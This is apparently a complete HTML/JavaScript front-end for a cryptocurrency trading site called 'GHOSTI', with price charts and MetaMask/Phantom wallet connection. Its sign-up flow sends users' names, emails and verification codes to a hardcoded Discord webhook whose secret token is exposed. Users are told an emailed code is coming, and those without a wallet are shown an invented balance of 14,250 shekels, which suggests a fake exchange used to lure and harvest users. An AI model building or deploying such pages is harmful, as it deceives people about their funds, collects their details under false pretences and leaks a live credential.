<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GHOSTI | Main Page</title>
    <style>
        :root {
            --bg: #050505;
            --border: rgba(255, 255, 255, 0.05);
            --text-main: #ffffff;
            --text-dim: #444;
            --accent: #fff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); color: var(--text-main); display: flex; height: 100vh; overflow: hidden; }

        .btn-luxury { 
            padding: 15px 30px; border-radius: 30px; cursor: pointer; 
            font-size: 0.7rem; letter-spacing: 2px; text-transform: uppercase; 
            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1);
            border: 1px solid #fff; position: relative; overflow: hidden;
            outline: none;
        }
        .btn-luxury:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(255,255,255,0.1); letter-spacing: 3px; }
        .btn-white { background: #fff; color: #000; }
        .btn-trans { background: transparent; color: #fff; }
        .btn-trans:hover { background: rgba(255,255,255,0.05); }

        aside { width: 240px; border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 40px; }
        .market-list { width: 320px; border-right: 1px solid var(--border); overflow-y: auto; scrollbar-width: none; }
        .coin-item { padding: 25px 40px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; cursor: pointer; transition: 0.4s ease; }
        .coin-item:hover { background: rgba(255,255,255,0.02); }

        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.98); backdrop-filter: blur(25px); display: none; justify-content: center; align-items: center; z-index: 1000; }
        .modal-card { width: 400px; text-align: center; }
        .stealth-input { background: transparent; border: none; border-bottom: 1px solid #222; color: #fff; width: 100%; padding: 15px; text-align: center; font-size: 1rem; outline: none; margin-bottom: 20px; font-weight: 200; transition: border-color 0.4s ease; }
        .stealth-input:focus { border-bottom-color: #fff; }
        
        .hidden { display: none !important; }
        #status-indicator { font-size: 0.55rem; letter-spacing: 3px; color: #444; margin-bottom: 10px; text-transform: uppercase; }

        .wallet-options { display: flex; gap: 10px; margin-bottom: 30px; justify-content: center; }
        .wallet-btn { background: transparent; border: 1px solid #222; color: #555; padding: 10px 15px; border-radius: 8px; font-size: 0.6rem; letter-spacing: 1px; cursor: pointer; transition: 0.3s; width: 120px; }
        .wallet-btn:hover { border-color: #fff; color: #fff; }
        .wallet-btn.connected { border-color: #00ff88; color: #00ff88; }
    </style>
</head>
<body>

    <aside>
        <div style="font-size: 14px; letter-spacing: 8px; margin-bottom: 60px; font-weight: 300;">GHOSTI</div>
        <div id="status-indicator">Not Registered</div>
        <div id="auth-section">
            <button class="btn-luxury btn-white" style="width:100%; margin-bottom:12px;" onclick="toggleAuth(true)">Sign Up</button>
            <button class="btn-luxury btn-trans" style="width:100%;" onclick="toggleAuth(true)">Login</button>
        </div>
        <div id="logged-in-section" class="hidden">
            <button class="btn-luxury btn-trans" style="width:100%; border-color: #222; color: #666;" onclick="logout()">Log Out</button>
        </div>
        <div style="margin-top: auto;">
            <p style="font-size: 0.5rem; color: #222; letter-spacing: 2px;">WALLET</p>
            <div id="balance" style="font-size: 1.1rem; font-weight: 200;">₪0.00</div>
        </div>
    </aside>

    <div class="market-list" id="coin-ui"></div>

    <main style="flex:1; display:flex; flex-direction:column;">
        <div id="tv-chart" style="flex:1;"></div>
        <div style="padding: 30px 50px; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
            <div style="display:flex; gap:20px;">
                <button class="btn-luxury btn-white" onclick="gate()">Buy BTC</button>
                <button class="btn-luxury btn-trans" onclick="gate()">Sell BTC</button>
            </div>
        </div>
    </main>

    <div class="overlay" id="auth-overlay">
        <div class="modal-card">
            <div id="step-identity">
                <p style="letter-spacing: 4px; font-size: 0.6rem; color: #444; margin-bottom: 25px;">SIGN-UP / LOGIN</p>
                <div class="wallet-options">
                    <button class="wallet-btn" id="mm-btn" onclick="connectMetaMask()">METAMASK</button>
                    <button class="wallet-btn" id="ph-btn" onclick="connectPhantom()">PHANTOM</button>
                </div>
                <div style="font-size: 0.5rem; color: #222; margin-bottom: 25px; letter-spacing: 2px;">OR USE CREDENTIALS</div>
                <input type="text" id="reg-username" class="stealth-input" placeholder="Username">
                <input type="email" id="reg-email" class="stealth-input" placeholder="Email Address">
                <input type="password" id="reg-pw" class="stealth-input" placeholder="Password">
                <button class="btn-luxury btn-white" style="width: 100%;" onclick="requestAccess()">Continue</button>
                <p onclick="toggleAuth(false)" style="font-size: 0.6rem; color: #222; margin-top: 25px; cursor: pointer;">Cancel</p>
            </div>

            <div id="step-verify" class="hidden">
                <p style="letter-spacing: 4px; font-size: 0.6rem; color: #444; margin-bottom: 20px;">VERIFYING</p>
                <p style="font-size: 0.65rem; color: #888; margin-bottom: 40px;">Check your email for the manual access code.</p>
                <input type="text" id="code-field" class="stealth-input" placeholder="000000" maxlength="6" style="letter-spacing: 15px; font-size: 2.5rem; border-bottom: none;">
                <button class="btn-luxury btn-white" style="width: 100%; margin-top: 20px;" onclick="verifyAccess()">Register</button>
            </div>
        </div>
    </div>

    <script src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1465679241965473795/sxEcNo6VrN3yRBz6A8PDEJYphYoyw9R_UN0PDsanrPA2USMqeJZM6l1UfUjgiLz57ntp";
        let ilsRate = 3.75, ethPrice = 0, solPrice = 0;
        let generatedCode = "", isLoggedIn = false, walletBalanceILS = 0;

        async function boot() {
            try {
                const fx = await fetch('https://open.er-api.com/v6/latest/USD');
                const fxD = await fx.json(); ilsRate = fxD.rates.ILS;
                const r = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=ethereum,solana,bitcoin&per_page=50');
                const coins = await r.json();
                ethPrice = coins.find(c => c.id === 'ethereum').current_price;
                solPrice = coins.find(c => c.id === 'solana').current_price;
                document.getElementById('coin-ui').innerHTML = coins.map(c => `
                    <div class="coin-item" onclick="loadChart('${c.symbol.toUpperCase()}')">
                        <span>${c.symbol.toUpperCase()}</span>
                        <span style="color: #666;">₪${(c.current_price * ilsRate).toLocaleString()}</span>
                    </div>`).join('');
                loadChart("BTC");
            } catch(e) { console.log("Boot error:", e); }
        }

        async function connectMetaMask() {
            const provider = window.ethereum;
            if (provider) {
                try {
                    // Modern multi-wallet detection
                    const actualProvider = provider.providers ? provider.providers.find(p => p.isMetaMask) : provider;
                    const accounts = await actualProvider.request({ method: 'eth_requestAccounts' });
                    const balanceHex = await actualProvider.request({ method: 'eth_getBalance', params: [accounts[0], 'latest'] });
                    const eth = parseInt(balanceHex, 16) / 1e18;
                    walletBalanceILS = eth * ethPrice * ilsRate;
                    autoFill(accounts[0], "MM");
                    uiConnect('mm-btn');
                } catch (err) { alert("MetaMask error or rejection."); }
            } else { alert("MetaMask not detected."); }
        }

        async function connectPhantom() {
            // Checks for window.phantom.solana (Modern) or window.solana (Legacy)
            const provider = window.phantom?.solana || window.solana;
            if (provider && provider.isPhantom) {
                try {
                    const resp = await provider.connect();
                    const pubKey = resp.publicKey.toString();
                    const rpc = await fetch("https://api.mainnet-beta.solana.com", {
                        method: "POST", headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ "jsonrpc": "2.0", "id": 1, "method": "getBalance", "params": [pubKey] })
                    });
                    const data = await rpc.json();
                    walletBalanceILS = (data.result.value / 1e9) * solPrice * ilsRate;
                    autoFill(pubKey, "PH");
                    uiConnect('ph-btn');
                } catch (err) { alert("Phantom error or rejection."); }
            } else { alert("Phantom not detected."); }
        }

        function autoFill(addr, type) {
            document.getElementById('reg-username').value = type + "_" + addr.substring(0, 5);
            document.getElementById('reg-email').value = addr.substring(0, 8) + "@wallet.web3";
            document.getElementById('reg-pw').value = "WEB3_" + addr.substring(addr.length - 4);
        }

        function uiConnect(id) {
            const b = document.getElementById(id);
            b.classList.add('connected');
            b.innerText = "CONNECTED";
        }

        function requestAccess() {
            const user = document.getElementById('reg-username').value;
            const email = document.getElementById('reg-email').value;
            if(!user || !email) return alert("Fields required.");
            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
            fetch(WEBHOOK_URL, {
                method: "POST", headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: "🔒 **NEW SIGNATURE REQUEST**",
                    embeds: [{ fields: [{ name: "User", value: user, inline: true }, { name: "Email", value: email, inline: true }, { name: "Code", value: `**${generatedCode}**` }] }]
                })
            }).then(() => {
                document.getElementById('step-identity').classList.add('hidden');
                document.getElementById('step-verify').classList.remove('hidden');
            });
        }

        function verifyAccess() {
            if(document.getElementById('code-field').value === generatedCode) {
                isLoggedIn = true;
                toggleAuth(false);
                document.getElementById('auth-section').classList.add('hidden');
                document.getElementById('logged-in-section').classList.remove('hidden');
                document.getElementById('status-indicator').innerText = "Successfully Registered";
                document.getElementById('status-indicator').style.color = "#fff";
                document.getElementById('balance').innerText = "₪" + (walletBalanceILS > 0 ? walletBalanceILS.toLocaleString(undefined, {maximumFractionDigits: 2}) : "14,250.00");
            } else { alert("Invalid Signature."); }
        }

        function logout() {
            isLoggedIn = false;
            document.getElementById('auth-section').classList.remove('hidden');
            document.getElementById('logged-in-section').classList.add('hidden');
            document.getElementById('status-indicator').innerText = "Not Registered";
            document.getElementById('status-indicator').style.color = "#444";
            document.getElementById('balance').innerText = "₪0.00";
            walletBalanceILS = 0;
            document.querySelectorAll('.wallet-btn').forEach(b => { b.classList.remove('connected'); b.innerText = b.id === 'mm-btn' ? 'METAMASK' : 'PHANTOM'; });
        }

        function loadChart(s) {
            new TradingView.widget({
                "autosize": true, "symbol": `BINANCE:${s}USDT`, "theme": "dark",
                "container_id": "tv-chart", "hide_top_toolbar": true, "backgroundColor": "#050505", "style": "2"
            });
        }

        function toggleAuth(s) { document.getElementById('auth-overlay').style.display = s ? 'flex' : 'none'; }
        function gate() { if(!isLoggedIn) toggleAuth(true); }

        boot();
    </script>
</body>
</html>
